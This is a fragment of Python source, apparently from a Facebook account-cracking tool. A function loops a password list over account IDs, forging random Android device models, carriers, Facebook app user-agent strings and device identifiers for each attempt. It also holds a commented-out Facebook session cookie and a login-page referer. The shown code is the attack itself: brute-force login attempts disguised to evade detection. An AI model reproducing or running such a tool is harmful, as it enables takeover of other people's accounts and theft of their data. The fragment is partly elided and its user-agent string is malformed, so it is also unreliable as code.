...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/41.0.0.12.41;FBBV/855166639;FBDM/{density=1.5,width=726,height=2495};FBLC/es_ES;FBCR/Axiata;FBMF/SM-N770F;FBBD/SM-N770F;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/11;nullFBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/149.0.0.45.224;FBBV/588872706;FBDM/{density=2.1045960422809125,width=955,height=2287};FBLC/ko_KR;FBRV/588872706;FBCR/fido;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F|LMY47V;FBSV/10.2.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/91.0.0.11.66;FBBV/321870177;FBDM/{density=1.804907971167039,width=1098,height=2206};FBLC/zh_CN;FBRV/321870177;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F|NMF26X;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/K5-3G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/Orca-Android;FBAV/216.0.0.5221;FBPN/com.facebook.orca;FBLC/ja_JP;FBBV/684518437;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBDV/SM-N770F|NRD90M;FBSV/9.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=922,height=1605};FB_FW/1;FBRV/684518437]" 
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
    ...
    # 'cookie': 'datr=YgjbZsKr-L4pzjKZw1ThIFeK; sb=YgjbZn7ZsWY6Terit-hJcT93; dpr=2.8860480785369873; ps_l=1; ps_n=1; wd=891x1683; fr=0P1FgI7FOPPAVcEYr.AWU_X7KCHxHMBn0xaX-epk8SBks.Bm2whj..AAA.0.0.Bm2wuW.AWW9pmG1ZkE',
    'dpr': '2.625',
    'referer': 'https://x.facebook.com/login/save-password-interstitial/?ref_component=x_footer&ref_page=%2Fwap%2Fhome.php&refid=7&paipv=0&eav=AfZtzDbGwHOu_CAuvOLoAAnD6Rwi-WNUfjxSraGB08CVGuTTZq9lhT3860xQ16hadks',
